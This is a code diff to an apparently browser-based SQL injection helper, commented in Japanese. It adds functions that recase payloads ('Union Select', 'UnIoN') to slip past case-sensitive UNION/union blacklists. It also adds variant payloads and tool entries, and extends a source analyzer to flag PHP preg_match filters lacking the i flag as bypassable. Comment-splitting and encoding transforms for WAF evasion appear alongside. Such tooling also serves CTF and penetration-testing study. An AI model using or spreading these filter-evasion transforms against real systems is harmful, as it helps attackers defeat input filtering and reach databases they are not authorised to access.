@@ -69,6 +69,44 @@ function randomCase(s){
   return out.join("");
 }
 
+function codeMask(s){
+  const m=new Array(s.length);
+  let inS=false;
+  for(let i=s.length-1;i>=0;i--){
+    const c=s[i];
+    if(c==="'"||c==='"'){ inS=!inS; m[i]=false; }
+    else m[i]=!inS;
+  }
+  return m;
+}
+
+function caseCap(s){
+  const m=codeMask(s);
+  const out=s.split("");
+  for(let i=0;i<s.length;i++){
+    const c=s[i];
+    if(!m[i]||!/[a-zA-Z]/.test(c)) continue;
+    if((c==="x"||c==="X")&&s[i-1]==="0") continue;
+    const left=i>0&&/[a-zA-Z]/.test(s[i-1])&&m[i-1];
+    out[i]=left?c.toLowerCase():c.toUpperCase();
+  }
+  return out.join("");
+}
+
+function altCase(s){
+  const m=codeMask(s);
+  const out=s.split("");
+  let up=true;
+  for(let i=0;i<s.length;i++){
+    const c=s[i];
+    if(!m[i]||!/[a-zA-Z]/.test(c)) continue;
+    if((c==="x"||c==="X")&&s[i-1]==="0") continue;
+    out[i]=up?c.toUpperCase():c.toLowerCase();
+    up=!up;
+  }
+  return out.join("");
+}
+
 function caseShift(s,dir){
   const out=new Array(s.length);
   let inS=false;
@@ -279,17 +317,22 @@ function applyFilters(payload, active, mode){
     if(tail==="#"&&!has("inline")) steps.push("末尾コメントを # に正規化 (スペース除去環境では -- の後続空白が消えて死ぬため。# は MySQL 専用なのでPG/MSSQLでは代替案の -- を使う)");
   }
 
-  if(has("upper")||has("lower")){
+  if(has("upper")||has("lower")||has("casecap")){
     const dir=has("upper")?"lower":"upper";
     const before=p;
-    p=caseShift(p,dir);
-    if(p!==before){
-      steps.push(dir==="lower"
-        ?"大文字が拒否されるため全トークンを小文字化 (引用符内と 0x 接頭辞は保持)"
-        :"小文字が拒否されるため引用符外を大文字化 (SQLは大文字小文字不区別 / 文字列リテラルと 0x 接頭辞は保持)");
+    if(has("casecap")){
+      p=caseCap(p);
+      if(p!==before) steps.push("UNION/union の区別一致拒否を想定し先頭大文字化 (Union Select 形式 / 引用符内と 0x 接頭辞は保持)");
+    }else{
+      p=caseShift(p,dir);
+      if(p!==before){
+        steps.push(dir==="lower"
+          ?"大文字が拒否されるため全トークンを小文字化 (引用符内と 0x 接頭辞は保持)"
+          :"小文字が拒否されるため引用符外を大文字化 (SQLは大文字小文字不区別 / 文字列リテラルと 0x 接頭辞は保持)");
+      }
     }
-    if(has("upper")&&has("lower")) warns.push("大文字も小文字も拒否される → キーワードを ASCII で書けない。16進リテラル・コメント分割・URLエンコード (%75nion) の組み合わせのみ生きる。");
-    if(dir==="upper") warns.push("大文字化の注意: DB側識別子の大文字小文字 (MySQL/Linuxのテーブル名は区別、Oracleディクショナリは大文字、PGの未クォート識別子は小文字) と、HEX() の出力が大文字である点に気をつける。");
+    if(has("upper")&&has("lower")) warns.push("大文字も小文字も拒否される → 文字クラス [A-Za-z] 拒否なら ASCII で書けないが、実際は 'UNION'/'union' の単語完全一致のケースが多い → casecap (Union) チップで先頭大文字化すれば通ることが多い。");
+    if(dir==="upper"&&!has("casecap")) warns.push("大文字化の注意: DB側識別子の大文字小文字 (MySQL/Linuxのテーブル名は区別、Oracleディクショナリは大文字、PGの未クォート識別子は小文字) と、HEX() の出力が大文字である点に気をつける。");
   }
 
   const leftovers=[];
@@ -301,6 +344,8 @@ function applyFilters(payload, active, mode){
   if(leftovers.length) warns.push("変換しきれていない文字が残存: "+leftovers.join(", ")+" → 手動調整が必要。");
 
   variants.push({t:"大文字小文字ランダム化 (WAF/正規表現が大小文字区別する場合)",p:randomCase(p)});
+  variants.push({t:"先頭大文字化 Union Select (UNION/union 完全一致拒否の回避)",p:caseCap(p)});
+  variants.push({t:"交互ケース UnIoN (同・区別一致の変奏)",p:altCase(p)});
 
   return {out:p,steps:steps,warns:warns,variants:variants};
 }
@@ -324,6 +369,7 @@ function analyzeSource(src){
     mode=mode||"reject";
     out.push({sev:"warn",msg:"preg_match ブラックリスト検出: /"+pat+"/"+flags,advice:[],match:pm[0].slice(0,120)});
     if(flags.includes("i")) out.push({sev:"warn",msg:"  └ i フラグ付き → 大小文字混合 (SeLeCt) による回避は無効。コメント分割/二重書きで。",advice:[],match:""});
+    else if(/union|select/i.test(pat)) out.push({sev:"ok",msg:"  └ i フラグなし = 大小文字区別の一致 → Union Select / UnIoN がそのまま通る (バイパス設定の UNION/union 一致拒否 チップ)",advice:[],match:""});
     const alts=pat.split("|");
     for(const alt of alts){
       const a=alt.replace(/\\([\s\S])/g,"$1").replace(/^\[|\]$/g,"");
@@ -881,6 +927,8 @@ function renderTools(){
     {t:"Unicodeエスケープ (\\u)",p:[...s].map(c=>"\\u"+c.codePointAt(0).toString(16).padStart(4,"0")).join(""),n:"JSON文脈等。"},
     {t:"HTMLエンティティ",p:s.replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[c])),n:"XSS文脈確認用。"},
     {t:"ランダムケース",p:randomCase(s),n:"SELECT → SeLeCt。引用符内は保持。/i が無い正規表現やWAF向け。"},
+    {t:"先頭大文字化 (Union Select)",p:caseCap(s),n:"UNION と union だけ完全一致で拒否するフィルタ (strpos系/i無しpreg) の回避。引用符内と 0x 接頭辞は保持。"},
+    {t:"交互ケース (UnIoN sElEcT)",p:altCase(s),n:"区別一致ブラックリスト回避の変奏。"},
     {t:"全小文字化 (大文字拒否対策)",p:caseShift(s,"lower"),n:"引用符内と 0x 接頭辞は保持。"},
     {t:"全大文字化 (小文字拒否対策)",p:caseShift(s,"upper"),n:"引用符内と 0x 接頭辞は保持。SQLキーワード大文字は全DBMSで有効。"},
     {t:"コメント分割",p:s.replace(/\s+/g,"/**/").replace(/\b(union|select|from|where|and|or)\b/gi,w=>w[0]+"/**/"+w.slice(1)),n:"WAF迂回 (アプリ側でデコード後は元に戻るので正規表現拒否にも有効)。"}
